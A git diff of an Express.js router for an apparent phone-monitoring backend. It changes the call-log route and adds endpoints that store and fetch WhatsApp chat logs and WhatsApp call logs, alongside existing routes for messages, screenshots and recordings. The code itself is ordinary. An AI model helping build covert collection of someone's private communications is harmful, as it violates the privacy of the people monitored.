@@ -1,7 +1,10 @@
 const express = require("express");
 const router = express.Router();
 const MonitoringController = require("../controller/MonitoringController");
-const { uploadRecording, uploadScreenshot } = require("../middleware/uploadMiddleware");
+const {
+  uploadRecording,
+  uploadScreenshot,
+} = require("../middleware/uploadMiddleware");
 
 // Auth Routes
 router.post("/signup", MonitoringController.signup);
@@ -14,7 +17,7 @@ router.get(
 );
 
 router.post("/add-logs", MonitoringController.addCallLog);
-router.get("/call-logs/:user_id", MonitoringController.getCallLogs);
+router.post("/call-logs", MonitoringController.getCallLogs);
 
 router.post("/add-messages", MonitoringController.addMessage);
 router.post("/messages", MonitoringController.getMessages);
@@ -41,5 +44,11 @@ router.post("/screenshots", MonitoringController.getScreenshots);
 
 router.post("/add-notification", MonitoringController.addNotification);
 router.post("/notifications", MonitoringController.getNotifications);
+
+router.post("/add-whatsapp-chat-logs", MonitoringController.addWhatsappChatLog);
+router.post("/whatsapp-chat-logs", MonitoringController.getWhatsappChatLogs);
+
+router.post("/add-whatsapp-call-logs", MonitoringController.addWhatsappCallLog);
+router.post("/whatsapp-call-logs", MonitoringController.getWhatsappCallLogs);
 
 module.exports = router;
